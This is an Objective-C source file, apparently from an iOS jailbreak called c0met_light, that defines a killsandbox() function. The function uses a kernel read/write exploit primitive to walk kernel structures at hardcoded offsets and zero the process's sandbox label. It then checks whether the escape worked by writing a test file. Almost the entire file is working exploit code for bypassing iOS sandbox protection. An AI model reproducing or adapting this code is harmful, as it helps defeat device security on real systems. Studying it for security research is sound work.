//
//  sandbox_util.m
//  c0met_light
//
//  Created by maverickdev1 on 17.02.2021.
//

#import <Foundation/Foundation.h>
#import "cicuta_virosa.h"

uint64_t killsandbox(uint64_t task_pac){
  
uint64_t task = task_pac | 0xffffff8000000000;



uint64_t proc_pac = read_64(task + 0x3A0);

  
uint64_t proc = proc_pac | 0xffffff8000000000;
  
uint64_t ucred_pac = read_64(proc + 0xf0);
  
uint64_t ucred = ucred_pac | 0xffffff8000000000;

   
uint64_t c_la_pac = read_64(ucred + 0x78);
uint64_t label = c_la_pac | 0xffffff8000000000;
    uint32_t nullified_val[5]={0,0,0,1,0};
    write_20(label + 0x10, (void*)nullified_val); //0x10 -> off_sandbox_slot
    
    FILE *f = fopen("/var/mobile/.sandboxtest", "w");

    if(f){
        printf("[+] Sandbox escaped -> 1");
        return 1; // ret=unsandboxed;
    }else{
        printf("[+] Failed to escape sandbox. something patched? -> 0");
    }
    return 0;
}
